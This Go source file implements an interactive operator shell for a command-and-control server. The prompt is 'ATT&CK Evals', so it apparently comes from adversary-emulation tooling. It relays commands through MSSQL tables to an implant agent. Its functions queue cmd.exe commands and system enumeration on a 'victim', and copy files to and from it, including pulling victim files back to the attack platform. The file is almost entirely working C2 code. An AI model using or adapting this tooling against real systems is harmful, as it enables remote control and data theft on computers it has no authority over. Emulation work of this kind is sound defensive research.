package dbcli

import (
	"fmt"
	"io/ioutil"
	"log"
	"database/sql"
	"time"
	"strconv"
	"strings"
	_ "github.com/denisenkom/go-mssqldb"
	"github.com/abiosoft/ishell"
)

// Start executes the interactive shell
func Start(password string, server string, user string, database string) {
	shell := ishell.New()
	shell.SetPrompt("(ATT&CK Evals)> ")

	connString := fmt.Sprintf("server=%s;user id=%s;database=%s;password=%s", server, user, database, password)
	conn, err := sql.Open("mssql", connString)
	if err != nil {
		log.Println("Unable to connect to database:", err.Error())
		return
	}
	createTables(*conn)
	// send agent taskings to C2 server
	shell.AddCmd(&ishell.Cmd{
		Name:    "exec-cmd",
		Aliases: []string{"exec", "shell", "run"},
		Help:    "Task agent to execute a cmd.exe command",
		Func: func(c *ishell.Context) {
			execCommand(strings.Join(c.Args, " "), *conn)
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "enum-system",
		Aliases: []string{"enum", "systems"},
		Help:    "Task agent to execute a series of functions to enumerate system",
		Func: func(c *ishell.Context) {
			execCommand("enum-system", *conn)
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "get-mac-serial",
		Aliases: []string{"mac", "serial"},
		Help:    "Task agent to execute a series of functions to get the MAC addr and serial",
		Func: func(c *ishell.Context) {
			execCommand("get-mac-serial", *conn)
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "exit",
		Aliases: []string{"quit", "q!"},
		Help:    "Exit program",
		Func: func(c *ishell.Context) {
			shell.Stop()
		},
	})

	shell.AddCmd(&ishell.Cmd{
		Name:    "list-sessions",
		Aliases: []string{"agents", "sessions", "list"},
		Help:    "List agent sessions",
		Func: func(c *ishell.Context) {
			listSession()
		},
	})

	// handle file uploads
	shell.AddCmd(&ishell.Cmd{
		Name:    "upload-file",
		Aliases: []string{"upload", "uf"},
		Help:    "upload-file \"/path/to/file.txt\" \"C:\\Windows\\Temp\\file.txt\"",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				c.Println("Usage: upload-file \"/path/to/file.txt\" \"C:\\\\Windows\\\\Temp\\\\file.txt\"")
				return
			}
			uploadFile(c.Args[0], c.Args[1], *conn)
		},
	})

	// handle file downloads
	shell.AddCmd(&ishell.Cmd{
		Name:    "download-file",
		Aliases: []string{"download", "dl"},
		Help:    "download-file \"C:\\Windows\\Temp\\file.txt\" \"/path/to/file.txt\"",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				c.Println("Usage: download-file \"C:\\Windows\\Temp\\file.txt\" \"/path/to/file.txt\"")
				return
			}
			downloadFile(c.Args[0], c.Args[1], *conn)
		},
	})

	shell.Run()
}

// drop tables if they exist
func dropTable(conn sql.DB, table string) {
	var dropErr error
	dropTable := "drop table if exists " + table
	_, dropErr = conn.Exec(dropTable)
	if dropErr != nil {
		log.Println("Unable to drop table:", dropErr)
	}
}

// drop tables if they exist and create requests/responses tables in database 
func createTables(conn sql.DB) {
	var reqErr error
	var respErr error

	dropTable(conn, "requests")
	dropTable(conn, "responses")

	createRequests := "create table requests (ID int IDENTITY(1,1) PRIMARY KEY, cmd varchar(max), filecontent varbinary(max))"
	_, reqErr = conn.Exec(createRequests)
	if reqErr != nil {
		log.Fatal(reqErr)
	}

	createResponses := "create table responses (ID int IDENTITY(1,1) PRIMARY KEY, response varchar(max), filecontent varbinary(max), request_id int)"
	_, respErr = conn.Exec(createResponses)
	if respErr != nil {
		log.Fatal(respErr)
	}
}

// execute commands on the victim and receive response
func execCommand(cmd string, conn sql.DB) {
	var id int
	var response string
	received := false
	iterations := 0

	insertSql := "insert into requests (cmd) output inserted.ID values ('" + cmd + "'); select SCOPE_IDENTITY();"
	
	err := conn.QueryRow(insertSql).Scan(&id)
	if err != nil {
		log.Println("Unable to execute insert:", err)
		return
	}
	log.Println("[i] Queued tasking: ", cmd)
	for received == false && iterations < 10 {
		time.Sleep(3 * time.Second)

		selectSql := "select response from responses where request_id = "
		selectErr := conn.QueryRow(selectSql + strconv.Itoa(id)).Scan(&response)
		if selectErr != nil {
			log.Println("Waiting for response...")
			iterations++
			if iterations == 10 {
				log.Println("Unable to receive response: ", selectErr)
			}
		} else {
			received = true
			log.Println(response)
		}
	}
}

// upload file on attack platform to victim
func uploadFile(src, dst string, conn sql.DB) {
	var id int
	var response string
	received := false
	iterations := 0

	delimiter := " "
	downloadInstructions := "download" + delimiter + dst
	//log.Println(downloadInstructions)
	insertSql := "insert requests (cmd, filecontent) output inserted.ID select '" + downloadInstructions + "' as cmd, * from openrowset (bulk '" + src + "', single_blob) as filecontent; select SCOPE_IDENTITY();"
	
	insertErr := conn.QueryRow(insertSql).Scan(&id)
	if insertErr != nil {
		log.Println("Unable to execute insert:", insertErr)
		return
	}
	log.Println("Sending file...")
	for received == false && iterations < 10 {
		time.Sleep(3 * time.Second)

		selectSql := "select response from responses where request_id = "
		selectErr := conn.QueryRow(selectSql + strconv.Itoa(id)).Scan(&response)
		if selectErr != nil {
			log.Println("Waiting for response...")
			iterations++
			if iterations == 10 {
				log.Println("Unable to receive response: ", selectErr)
			}
		} else {
			received = true
			log.Println(response)
		}
	}
}

// download file from victim to attack platform (temp directory)
func downloadFile(src, dst string, conn sql.DB) {
	// tell agent to upload file to server
	var id int
	var content []byte
	received := false
	iterations := 0
	delimiter := " "
	downloadInstructions := "upload" + delimiter + src
	//log.Println(downloadInstructions)

	insertSql := "insert into requests (cmd) output inserted.ID values ('" + downloadInstructions + "'); select SCOPE_IDENTITY();"
	
	err := conn.QueryRow(insertSql).Scan(&id)
	if err != nil {
		log.Println("Unable to execute insert:", err)
		return
	}
	log.Println("Waiting to receive file...")
	for received == false && iterations < 10 {
		time.Sleep(3 * time.Second)

		selectSql := "select filecontent from responses where request_id = "
		selectErr := conn.QueryRow(selectSql + strconv.Itoa(id)).Scan(&content)
		if selectErr != nil {
			log.Println("Waiting for response...")
			iterations++
			if iterations == 10 {
				log.Println("Unable to receive response: ", selectErr)
			}
		} else {
			received = true
			log.Println("File received!")
		}
	}
	
	err = ioutil.WriteFile(dst, content, 0644)
	if err != nil {
		log.Println(err)
	}
}

func listSession() {
	fmt.Println()
	log.Println("Sorry, this feature isn't developed yet :(")
}
